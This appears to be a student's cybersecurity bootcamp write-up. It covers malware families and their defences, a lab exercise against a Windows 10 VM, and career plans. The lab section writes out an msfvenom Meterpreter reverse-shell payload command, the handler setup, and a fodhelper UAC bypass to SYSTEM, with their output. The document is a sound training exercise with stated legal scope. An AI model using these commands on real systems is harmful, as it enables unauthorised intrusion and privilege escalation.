# S08 — Client-Side Attacks: Payloads, Privilege Escalation and Career Paths

**Author:** Raja Wardet Wahaj (Wolf)
**Program:** DFCS Bootcamp, Atomcamp (Cohort 2)
**Environment:** Kali Linux attacker (192.168.37.129) / Windows 10 target (192.168.37.133), isolated host-only lab, snapshot taken before use.

Full write-up: `DFCS_Day4_HomeWork_Raja_Wardet_Wahaj.docx` (add it to this folder, or export it as `day4-homework.md`/PDF).

---

## Task 1 — Malware Classification

Nine malware families, each scored on whether it needs user interaction, since that determines the defence: a family that needs a human to run it is reduced by training and filtering, while a worm that needs no decision is stopped only by patching and segmentation.

| Family | Example | How it spreads | Control that would have stopped it |
|---|---|---|---|
| Virus | Melissa (1999) | Attaches to a file/macro; runs when the user opens the host file | Macro blocking, attachment filtering, signature AV, user training |
| Worm | WannaCry, Conficker | Self-propagates via a service vulnerability (SMB/MS17-010); no user action needed | Patching (MS17-010), network segmentation |
| Trojan | Emotet, Zeus | Poses as legitimate software; user installs it, opens a backdoor | Application control (AppLocker/WDAC), signed-binary enforcement, training |
| Ransomware | LockBit, WannaCry | Phishing, exploitation, or a worm; encrypts data for payment | Offline/immutable backups, patching, email filtering, segmentation |
| Spyware | Agent Tesla, FinFisher | Bundled or dropped by a trojan; silently collects keystrokes/data | EDR/behavioural detection, application control, egress monitoring |
| Adware | Fireball | Bundled with free software; injects ads, sometimes proxies traffic | Application control, vetted software sources, browser hardening |
| Rootkit | TDL-4, Necurs | Installed post-compromise; hides at kernel/firmware level | Secure Boot, driver signing, integrity monitoring; rebuild, don't clean |
| Botnet agent | Mirai (IoT), Emotet | Delivered by worm/trojan/exploit; enrols host into a C2 network | Change default credentials, egress filtering, patching, traffic monitoring |
| Fileless malware | PowerShell Empire, Poweliks | Abuses signed tools (PowerShell, mshta, rundll32), often via a macro; lives in memory/registry | Behavioural detection (Sysmon + SIEM), PowerShell logging/constrained language mode, macro blocking |

---

## Task 2 — Payload Lab Write-up

End-to-end Meterpreter reverse-shell exercise: generate the payload, catch it with a handler, confirm the session, then escalate to SYSTEM after UAC blocks the first attempt. Performed only against a Windows 10 VM I control, on an isolated host-only network (see Legal and Scope Constraints).

### Step 1 — Generate the payload with msfvenom

A `reverse_tcp` payload is used because the target connects outbound to the attacker: firewalls generally permit outbound traffic, so a reverse shell succeeds where a bind shell (inbound) would be blocked.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.37.129 LPORT=4433 -f exe -o win.exe
```

```
Payload size: 355 bytes
Final size of exe file: 7168 bytes
Saved as: win.exe
```

![msfvenom payload generation](figures/t2-msfvenom-payload.png)

### Step 2 — Start the handler

The handler must match the payload on all three values (payload name, LHOST, LPORT); any mismatch produces a session that silently never appears.

```
msfconsole -q
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.37.129
set LPORT 4433
run
```

```
[*] Started reverse TCP handler on 192.168.37.129:4433
```

![Handler setup](figures/t2-handler-session1.png)

### Step 3 — Session opens and identity is confirmed

Once `win.exe` runs on the target, the stager connects outbound to `LHOST:LPORT`, the handler accepts it, and a session opens.

```
meterpreter > getuid
Server username: DESKTOP-IEB6UAN\Hp
```

![Session opened, getuid](figures/t2-getuid-student.png)

### Step 4 — getsystem fails, and why

```
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied.
```

This is the expected result, not a failure. The account is an Administrator, but UAC gives it a filtered token for the interactive session — the standard-user version of its access token. SYSTEM-level actions need the full elevated token, issued only after a consent prompt. `getsystem` tries to impersonate a SYSTEM token directly, but with only a filtered token on hand there is nothing to impersonate, so Windows denies it. UAC is working as designed here; the correct response is a specific UAC bypass, not a generic retry.

### Step 5 — UAC bypass and escalation to SYSTEM

The bypass abuses an auto-elevating Windows binary (`fodhelper.exe`), which is why it still works on many builds.

```
background
search bypassuac
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set LHOST 192.168.37.129
set LPORT 4433
exploit
```

```
[+] UAC is set to Default
[+] Part of Administrators group! Continuing...
[*] Meterpreter session 2 opened
meterpreter > getuid
Server username: DESKTOP-IEB6UAN\Hp
meterpreter > getsystem -t 1
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin))
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

![getsystem succeeds, NT AUTHORITY\SYSTEM](figures/t2-bypassuac-system.png)

Two details matter here. First, immediately after the bypass `getuid` still reads the same username — the escalation is about the token, not the name, so the session already holds an elevated token even though the username hasn't changed. Second, `getsystem` now succeeds where it failed in Step 4, because an elevated token is finally present to impersonate.

### Legal and scope constraints

Every technique above was demonstrated only against a Windows 10 virtual machine I control, on an isolated host-only network, for the purpose of learning defence. Generating or delivering an unrequested payload to any system or person I do not own is a criminal offence under PECA 2016 in Pakistan, and under equivalent legislation elsewhere. A test like this is lawful only inside a written, authorised scope — for a client who has asked for it in writing, against assets explicitly listed in that scope, within the agreed dates — and it ends with a report.

---

## Task 3 — Career Statement

The specialism I'm aiming for is network penetration testing — infrastructure and Active Directory — with an initial SOC analyst (L1) role as the realistic entry point into the Pakistani market. SOC work in a bank or managed-SOC gives daily exposure to real alerts, detection logic and the defender's view, which makes for a better attacker while paying for the offensive skill build.

**Credentials:** eJPT first, then PNPT or OSCP for network/AD penetration testing. In parallel, standing up Wazuh to learn SOC fundamentals — the open-source route into the L1 role, and a portfolio artefact at the same time.

**Three concrete portfolio items within three months:**
- A documented home lab (Kali + Windows 10 + a Wazuh manager on a third Linux host) with the agent deployed, generating activity from Kali (port scans, failed logons, a payload execution) and showing the resulting alerts on the Wazuh dashboard.
- A clean GitHub repository of write-ups from every day of this bootcamp — scanning, exploitation, this client-side module — each with exact commands, output and remediation, written so a non-technical manager can follow the finding.
- 10–15 completed TryHackMe rooms plus a handful of retired Hack The Box machines, each with notes on not just what was run but why, and what would have stopped it.

*A certificate gets a CV past the automated filter, a portfolio gets the interview, and the ability to explain a finding in business terms gets the offer.*

---

## References

1. Offensive Security / Rapid7, msfvenom documentation — https://docs.metasploit.com/
2. Rapid7, Metasploit multi/handler and Meterpreter reference — https://docs.rapid7.com/metasploit/
3. Microsoft, How User Account Control works — https://learn.microsoft.com/en-us/windows/security/application-security/application-control/user-account-control/how-it-works
4. MITRE ATT&CK, Bypass User Account Control (T1548.002) — https://attack.mitre.org/techniques/T1548/002/
5. Government of Pakistan, PECA 2016 — https://na.gov.pk/uploads/documents/1470910659_707.pdf
6. Wazuh, Open-source SIEM and XDR documentation — https://documentation.wazuh.com/
